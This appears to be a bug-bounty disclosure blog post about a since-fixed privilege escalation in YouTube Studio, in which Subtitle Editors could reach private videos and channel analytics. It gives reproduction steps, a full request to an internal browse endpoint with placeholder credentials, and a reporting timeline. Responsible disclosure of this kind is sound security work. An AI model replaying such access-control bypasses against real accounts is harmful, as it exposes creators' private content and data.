---
title: Exploiting YouTube’s Permission Model :&nbsp;A Privilege Escalation case
categories:
- write-ups
excerpt: |
  My experience of discovering and reporting  a Privilege Escalation case in YouTube Studio (sub-unit of Google). In this blog post, i’ll explain all the technical part and non-technical parts of it.
image: "https://picsum.photos/2560/600?image=733"
---

---

##### This issue was responsibly reported to Google and has been confirmed fixed. Thanks to the Google security team for their cooperation.

<img src="/assets/logos/fixed.png" alt="fixed-proof" width="1000" height="auto">

---

### My Approach?

1 - My approach does not involves reconnaissance, instead focusing directly on the main application.

2 - In this case, I applied the same method and began testing YouTube Studio’s immediately.

3 - After spending 2-3 hours examining the permission model without notable findings, I shifted attention to accounts with lower privileges, which led to the discovery of this privilege escalation Issue.


### Affected Product
- [YouTube Studio](https://studio.youtube.com/) — Channel Management Console

### Vulnerability Type
- Privilege Escalation
- Role-Based Access Control Bypass

### Severity
- Medium 🟡

### Description
- The [Subtitle Editor role on YouTube Studio](https://support.google.com/youtube/answer/9481328#:~:text=Subtitle%20Editor,-Can%20add%2C%20edit) is intended only for adding and editing subtitles on assigned videos. 

<img src="/assets/logos/permission_model.png" alt="permission_model" width="1000" height="auto">

- However, through a combination of UI access and direct API calls, it was possible for Subtitle Editors to:
    - View all private videos uploaded to the channel, even those not explicitly shared with them.
    - Access total channel viewership metrics, exposing sensitive analytics data normally reserved for owners or managers


### Reproduction Steps

##### As the Channel Owner (User-A):

- Create a YouTube channel.
- Invite a user (User-B) and assign them the Subtitle Editor role.
- Upload one or more Private videos to the channel.

##### As the Subtitle Editor (User-B):

- Log in to YouTube Studio and navigate to the Subtitles tab.
- Notice that private videos are listed and accessible.
- Use a crafted API request to YouTube’s internal browse endpoint to retrieve detailed video and channel data, including total viewership metrics.

##### Vulnerable Request

```http
POST /youtubei/v1/browse?prettyPrint=false HTTP/2
Host: www.youtube.com
Cookie: {USER-B_SSSION}
Content-Length: 4412
Sec-Ch-Ua-Full-Version-List: 
Sec-Ch-Ua-Platform: "Windows"
Authorization: {USER-B_TOKEN}
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
...snip...
Referer: https://www.youtube.com/channel/{channel-id}/about
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"context":{"client":{"hl":"en-GB","gl":"IN","remoteHost":"10.20.30.40","deviceMake":"","deviceModel":"","visitorData":"{visitor_tdata}","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36,gzip(gfe)","clientName":"WEB","clientVersion":"2.20250423.01.00","osName":"Windows","osVersion":"10.0","originalUrl":"{TARGET_VIDEO_URL}","platform":"DESKTOP","clientFormFactor":"UNKNOWN_FORM_FACTOR","configInfo":{"appInstallData":"{AppInstallData}","coldConfigData":"{cold_config_data}","coldHashData":"{cold-hash_data}","hotHashData":"{hotHashData}"},"userInterfaceTheme":"USER_INTERFACE_THEME_DARK","timeZone":"Asia/Calcutta","browserName":"Chrome","browserVersion":"133.0.0.0","acceptHeader":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","deviceExperimentId":"{device_experiment_id}","rolloutToken":"{roll_out_token}","screenWidthPoints":1366,"screenHeightPoints":633,"screenPixelDensity":1,"screenDensityFloat":1,"utcOffsetMinutes":330,"connectionType":"CONN_CELLULAR_4G","memoryTotalKbytes":"8000000","mainAppWebInfo":{"graftUrl":"https://www.youtube.com/channel/{CHANNEL-ID}/about","pwaInstallabilityStatus":"PWA_INSTALLABILITY_STATUS_UNKNOWN","webDisplayMode":"WEB_DISPLAY_MODE_BROWSER","isWebNativeShareAvailable":true}},"user":{"lockedSafetyMode":false,"serializedDelegationContext":"serialized_delegation_context"},"request":{"useSsl":true,"internalExperimentFlags":[],"consistencyTokenJars":[]},"clickTracking":{"clickTrackingParams":"CCMQuy8YACIREDACTEDDFbdVnQkd13U9-Q=="},"adSignalsInfo":{"params":[{"key":"dt","value":"174549581"},{"key":"flash","value":"0"},{"key":"frm","value":"0"},{"key":"u_tz","value":"330"},{"key":"u_his","value":"2"},{"key":"u_h","value":"768"},{"key":"u_w","value":"1366"},{"key":"u_ah","value":"720"},{"key":"u_aw","value":"1366"},{"key":"u_cd","value":"24"},{"key":"bc","value":"31"},{"key":"bih","value":"633"},{"key":"biw","value":"1351"},{"key":"brdim","value":"0,0,0,0,1366,0,1366,720,1366,633"},{"key":"vis","value":"1"},{"key":"wgl","value":"true"},{"key":"ca_type","value":"image"}],"bid":"{bid}"}},"continuation":"{continuation}"}
```

> This request returned analytics data and private video information, which should have been inaccessible to the Subtitle Editor.


### Expected Behavior
- Subtitle Editors should only be able to add or edit subtitles on videos they are explicitly allowed to manage.

- They should not see videos marked as Private unless explicitly shared.

- Analytics and total viewership metrics must be strictly restricted to channel Owners/Managers.

### Proof Of Concept

<iframe width="560" height="315" src="https://www.youtube.com/embed/N_Sw4ajOvYs?si=9XUwum65G-wOlhZR" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

### Impact & Risk
- Exposure of confidential unpublished content: Private videos intended for internal review or embargoed releases become visible to lower-privileged users.

- Leak of sensitive analytics data: Total channel viewership and performance metrics could give competitors unfair insights or lead to insider leaks.

- Role-based access control failure: Undermines trust in YouTube Studio’s permission system, potentially causing operational risks for content creators.

### Real-World Scenario
- Imagine a tech company preparing a highly confidential product launch on YouTube. They assign subtitle editors to finalize captioning on unrelated videos. These subtitle editors, due to this vulnerability, can access the unreleased launch videos and associated performance metrics, potentially leaking sensitive information externally.

### Conclusion
- Thanks to GoogleVRP, Google has since fixed the issue, improving the security posture of YouTube Studio for millions of creators worldwide.

#### Timeline
- Reported -> 27/Apr/2025
- Triaged  -> 27/Apr/2025
- Need More Info -> 07/May/2025
- Reviewing -> 19/May/2025
- 🎉 Nice catch! -> 26/May/2025
- $500 Paid -> 24/July/2025
- Fixed --> 11/Aug/2025
